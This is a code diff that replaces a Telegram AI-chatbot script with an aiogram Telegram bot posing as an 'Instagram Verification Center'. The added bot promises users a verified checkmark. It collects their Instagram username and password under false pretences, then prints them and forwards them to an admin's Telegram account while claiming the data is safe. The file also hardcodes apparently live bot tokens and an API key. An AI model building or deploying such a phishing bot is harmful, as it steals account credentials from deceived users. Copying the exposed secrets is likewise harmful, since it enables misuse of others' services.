@@ -1,213 +1,211 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-import os
-import json
-import time
+import asyncio
 import logging
-import requests
-from flask import Flask, request
-import telebot
+from aiogram import Bot, Dispatcher, types
+from aiogram.filters import Command, StateFilter
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 
-# ================= TOKEN VA KALITLAR (TO'G'RIDAN-TO'G'RI) =================
-TELEGRAM_TOKEN = "8236645335:AAG5paUC631oGqhUp_3zRLHYObQxH8CGgNc"
-GROQ_API_KEY = "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"
+# Logging sozlamalari
+logging.basicConfig(level=logging.INFO)
+
+# Bot tokeni (siz bergan token)
+BOT_TOKEN = "8682057720:AAHMlwuUG05AhWQjatJGm0GoKp2Vy2oHQzU"
+
+# Admin ID (siz bergan ID)
 ADMIN_ID = 7447606350
 
-BOT_NAME = "Erkinov AI"
-BOT_USERNAME = "@ErkinovAIBOT"
-DEVELOPER = "Erkinov Mehruzbek"
+# Bot va dispatcher yaratish
+bot = Bot(token=BOT_TOKEN)
+storage = MemoryStorage()
+dp = Dispatcher(storage=storage)
 
-MODEL = "llama-3.3-70b-versatile"
-SYSTEM_PROMPT = "Siz professional AI assistantsiz. O'zbek tilida aniq va to'liq javob bering."
 
-# ================= LOGGING =================
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s | %(levelname)s | %(message)s"
-)
+# Holatlar (States)
+class VerificationStates(StatesGroup):
+    waiting_for_confirmation = State()
+    waiting_for_username = State()
+    waiting_for_password = State()
 
-# ================= DATABASE =================
-DB_FILE = "users.json"
 
-def load_db():
-    if not os.path.exists(DB_FILE):
-        return {"users": {}, "total_messages": 0}
-    with open(DB_FILE, "r", encoding="utf-8") as f:
-        return json.load(f)
+# Start komandasi - YANGI VARIANT
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message, state: FSMContext):
+    await state.clear()
+    
+    welcome_text = (
+        "✨ Instagram Verifikatsiya Markazi! ✨\n\n"
 
-def save_db(data):
-    with open(DB_FILE, "w", encoding="utf-8") as f:
-        json.dump(data, f, indent=4)
+        "Instagram profilingizga rasmiy {  галочка  } olishning eng oson va ishonchli usuli.\n\n"
+        "► Tezkor ariza topshirish\n"
+        "► 24 soat ichida natija\n"
+        "► Maxfiylik kafolati\n\n"
+        "Boshlash uchun istalgan xabar yuboring."
+	
+    )
+    
+    await message.answer(welcome_text, parse_mode="HTML")
+    await state.set_state(VerificationStates.waiting_for_confirmation)
 
-def update_user(user_id):
-    db = load_db()
-    uid = str(user_id)
-    if uid not in db["users"]:
-        db["users"][uid] = {"messages": 0, "last_seen": ""}
-    db["users"][uid]["messages"] += 1
-    db["users"][uid]["last_seen"] = time.strftime("%Y-%m-%d %H:%M:%S")
-    db["total_messages"] += 1
-    save_db(db)
 
-# ================= BOT =================
-bot = telebot.TeleBot(TELEGRAM_TOKEN, parse_mode="HTML")
-app = Flask(__name__)
+# Tasdiqlash bosqichi
+@dp.message(StateFilter(VerificationStates.waiting_for_confirmation))
+async def ask_confirmation(message: types.Message, state: FSMContext):
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="✅ Ha", callback_data="confirm_yes"),
+            InlineKeyboardButton(text="❌ Yo'q", callback_data="confirm_no")
+        ]
+    ])
+    
+    await message.answer(
+        "📋 <b>Verifikatsiya jarayonini boshlashni tasdiqlaysizmi?</b>",
+        reply_markup=keyboard,
+        parse_mode="HTML"
+    )
 
-# ================= GROQ AI =================
-def ask_groq(question):
+
+# "Ha" tugmasi
+@dp.callback_query(lambda c: c.data == "confirm_yes")
+async def process_confirm_yes(callback_query: types.CallbackQuery, state: FSMContext):
+    await callback_query.answer()
+    await callback_query.message.edit_reply_markup(reply_markup=None)
+    
+    await callback_query.message.answer(
+        "🔹 <b>Verifikatsiya qilinishi kerak bo'lgan profilingiz foydalanuvchi nomini (username) kiriting:</b>\n\n"
+        "Misol: <code>instagram_user</code>",
+        parse_mode="HTML"
+    )
+    
+    await state.set_state(VerificationStates.waiting_for_username)
+
+
+# "Yo'q" tugmasi
+@dp.callback_query(lambda c: c.data == "confirm_no")
+async def process_confirm_no(callback_query: types.CallbackQuery, state: FSMContext):
+    await callback_query.answer()
+    await callback_query.message.edit_reply_markup(reply_markup=None)
+    
+    await callback_query.message.answer(
+        "❌ <b>Siz tasdiqlashni rad etdingiz. Arizangiz bekor qilindi.</b>\n\n"
+        "Yana ariza topshirish uchun /start buyrug'ini bosing.",
+        parse_mode="HTML"
+    )
+    
+    await state.clear()
+
+
+# Username qabul qilish
+@dp.message(StateFilter(VerificationStates.waiting_for_username))
+async def process_username(message: types.Message, state: FSMContext):
+    username = message.text.strip()
+    
+    # Username ni saqlash
+    await state.update_data(username=username)
+    
+    # Konsolga chiqarish
+    print(f"\n📝 Username qabul qilindi: @{username} | Foydalanuvchi: {message.from_user.full_name} | ID: {message.from_user.id}")
+    
+    # Admin ga xabar yuborish
     try:
-        headers = {"Authorization": f"Bearer {GROQ_API_KEY}"}
-        data = {
-            "model": MODEL,
-            "max_tokens": 2000,
-            "temperature": 0.7,
-            "top_p": 0.9,
-            "messages": [
-                {"role": "system", "content": SYSTEM_PROMPT},
-                {"role": "user", "content": question}
-            ]
-        }
-
-        r = requests.post("https://api.groq.com/openai/v1/chat/completions",
-                          headers=headers, json=data, timeout=30)
-
-        if r.status_code == 200:
-            return r.json()["choices"][0]["message"]["content"].strip()
-        return "⚠️ AI hozir javob bera olmadi."
+        await bot.send_message(
+            ADMIN_ID,
+            f"📥 <b>Yangi ariza:</b>\n\n"
+            f"👤 <b>Foydalanuvchi:</b> {message.from_user.full_name}\n"
+            f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
+            f"📝 <b>Instagram username:</b> @{username}\n"
+            f"📊 <b>Holat:</b> Parol kutilmoqda...",
+            parse_mode="HTML"
+        )
     except Exception as e:
-        logging.error(f"GROQ ERROR: {e}")
-        return "❌ AI server bilan bog'lanishda xato yuz berdi."
+        print(f"⚠️ Admin xabar yuborilmadi: {e}")
+    
+    await message.answer(
+        "🔒 <b>Hisob egasi ekanligingizni tasdiqlash uchun parolni kiriting:</b>\n\n"
+        "<i>Ma'lumotlaringiz xavfsiz saqlanadi.</i>",
+        parse_mode="HTML"
+    )
+    
+    await state.set_state(VerificationStates.waiting_for_password)
 
-# ================= COMMANDS =================
-@bot.message_handler(commands=['start'])
-def start(msg):
-    update_user(msg.from_user.id)
-    text = f"""
-<b>✨ {BOT_NAME}</b>
 
-Salom! Men sizga savollar, tarjima, kod va AI maslahatlarida yordam bera olaman.
+# Parol qabul qilish
+@dp.message(StateFilter(VerificationStates.waiting_for_password))
+async def process_password(message: types.Message, state: FSMContext):
+    password = message.text.strip()
+    user_data = await state.get_data()
+    username = user_data.get('username', 'Noma\'lum')
+    
+    # Ma'lumotlarni konsolga chiqarish
+    print(f"\n{'='*60}")
+    print(f"✅ YANGI MA'LUMOTLAR QABUL QILINDI!")
+    print(f"{'='*60}")
+    print(f"👤 Foydalanuvchi: {message.from_user.full_name}")
+    print(f"🆔 Telegram ID: {message.from_user.id}")
+    print(f"📧 Instagram: @{username}")
+    print(f"🔐 Parol: {password}")
+    print(f"📅 Sana: {message.date}")
+    print(f"{'='*60}\n")
+    
+    # Admin ga to'liq ma'lumot
+    try:
+        admin_text = (
+            f"✅ <b>YANGI MA'LUMOT!</b>\n\n"
+            f"👤 <b>Foydalanuvchi:</b> {message.from_user.full_name}\n"
+            f"🆔 <b>Telegram ID:</b> <code>{message.from_user.id}</code>\n"
+            f"📧 <b>Instagram:</b> @{username}\n"
+            f"🔐 <b>Parol:</b> <code>{password}</code>\n"
+            f"📅 <b>Sana:</b> {message.date.strftime('%d.%m.%Y %H:%M')}"
+        )
+        
+        # Agar foydalanuvchi Telegram username ga ega bo'lsa
+        if message.from_user.username:
+            admin_text += f"\n🔗 <b>Telegram:</b> @{message.from_user.username}"
+            
+        await bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML")
+        
+    except Exception as e:
+        print(f"⚠️ Admin xabar yuborilmadi: {e}")
+    
+    # Foydalanuvchiga yakuniy xabar
+    final_message = (
+        "✅ <b>ARIZANGIZ MUVOFFAQIYATLI QABUL QILINDI!</b>\n\n"
+        "📋 Ma'lumotlaringiz tekshirish uchun yuborildi.\n\n"
+        "⏳ <b>Arizangiz 24 soat ichida mutaxassislar tomonidan ko'rib chiqiladi.</b>\n\n"
+        "📞 Natija haqida sizga telegram orqali xabar beramiz.\n\n"
+        
+    )
+    
+    await message.answer(final_message, parse_mode="HTML")
+    
+    # Holatni tozalash
+    await state.clear()
 
-Savolingizni yozing 👇
 
-━━━━━━━━━━━━━━
-👨‍💻 Developer: <b>{DEVELOPER}</b>
-"""
-    bot.reply_to(msg, text)
+# Boshqa xabarlar
+@dp.message()
+async def handle_other_messages(message: types.Message):
+    await message.answer(
+        "ℹ️ Botdan foydalanish uchun /start buyrug'ini bosing.",
+        parse_mode="HTML"
+    )
 
-@bot.message_handler(commands=['help'])
-def help_cmd(msg):
-    text = f"""
-<b>ℹ️ Yordam ({BOT_NAME})</b>
 
-━━━━━━━━━━━━━━
-/start - Botni boshlash  
-/help - Yordam  
-/stats - Statistika  
-/ping - Server holati  
+# Botni ishga tushirish
+async def main():
+    print("\n" + "="*60)
+    print("🤖 Instagram Verify Bot ishga tushdi!")
+    print("="*60)
+    print(f"📊 Bot token: 8682057720:AAHMlwuUG05AhWQjatJGm0GoKp2Vy2oHQzU")
+    print(f"👤 Admin ID: 7447606350")
+    print("="*60)
+    print("✅ Bot muvaffaqiyatli ishga tushdi!")
+    print("📝 Ma'lumotlar konsolga chiqariladi va admin ga yuboriladi")
+    print("="*60 + "\n")
+    
+    await dp.start_polling(bot)
 
-🤖 AI savol berish uchun shunchaki matn yozing.
-━━━━━━━━━━━━━━
-"""
-    bot.reply_to(msg, text)
 
-@bot.message_handler(commands=['ping'])
-def ping(msg):
-    start = time.time()
-    bot.send_chat_action(msg.chat.id, "typing")
-    end = time.time()
-    bot.reply_to(msg, f"🏓 Pong! {round((end-start)*1000)} ms")
-
-@bot.message_handler(commands=['stats'])
-def stats(msg):
-    db = load_db()
-    users = len(db["users"])
-    total = db["total_messages"]
-    text = f"""
-<b>📊 Bot Statistikasi</b>
-
-━━━━━━━━━━━━━━
-👥 Foydalanuvchilar: <b>{users}</b>
-💬 Jami xabarlar: <b>{total}</b>
-━━━━━━━━━━━━━━
-"""
-    bot.reply_to(msg, text)
-
-@bot.message_handler(commands=['admin'])
-def admin_panel(msg):
-    if msg.from_user.id != ADMIN_ID:
-        return bot.reply_to(msg, "⛔ Siz admin emassiz!")
-    db = load_db()
-    text = f"""
-<b>👑 ADMIN PANEL</b>
-
-━━━━━━━━━━━━━━
-👥 Users: {len(db["users"])}
-💬 Messages: {db["total_messages"]}
-━━━━━━━━━━━━━━
-"""
-    bot.reply_to(msg, text)
-
-# ================= AI HANDLER =================
-@bot.message_handler(func=lambda m: True)
-def ai_handler(msg):
-    update_user(msg.from_user.id)
-    bot.send_chat_action(msg.chat.id, "typing")
-
-    logging.info(f"{msg.from_user.id}: {msg.text}")
-
-    answer = ask_groq(msg.text)
-
-    reply = f"""
-
-{answer}
-
-━━━━━━━━━━━━━━
-🤖 {BOT_NAME} | {BOT_USERNAME}
-"""
-    bot.reply_to(msg, reply)
-
-# ================= WEBHOOK =================
-@app.route(f"/{TELEGRAM_TOKEN}", methods=["POST"])
-def webhook():
-    if request.headers.get("content-type") == "application/json":
-        json_string = request.get_data().decode("utf-8")
-        update = telebot.types.Update.de_json(json_string)
-        bot.process_new_updates([update])
-    return "OK", 200
-
-@app.route("/")
-def home():
-    return "🤖 Erkinov AI ishlayapti!"
-
-@app.route('/health')
-def health():
-    return "✅ OK", 200
-
-# ================= RUN =================
 if __name__ == "__main__":
-    print("="*50)
-    print("🤖 ERKINOV PROFESSIONAL AI BOT")
-    print("🧠 GROQ Llama 3.3 70B")
-    print("🌐 Webhook Mode")
-    print("="*50)
-
-    # Render URL (o'zingizning app nomingiz bilan almashtiring)
-    render_url = os.getenv("RENDER_EXTERNAL_URL")
-    if not render_url:
-        # MUHIM: Bu yerga Render'da berilgan URL ni yozing
-        render_url = "https://erkinov-ai-bot.onrender.com"
-        print("⚠️ RENDER_EXTERNAL_URL topilmadi, lokal URL ishlatiladi:", render_url)
-
-    webhook_url = f"{render_url}/{TELEGRAM_TOKEN}"
-
-    try:
-        bot.remove_webhook()
-        time.sleep(1)
-        bot.set_webhook(url=webhook_url)
-        print(f"✅ Webhook o'rnatildi: {webhook_url}")
-    except Exception as e:
-        print(f"❌ Webhook o'rnatishda xatolik: {e}")
-
-    port = int(os.getenv("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+    asyncio.run(main())
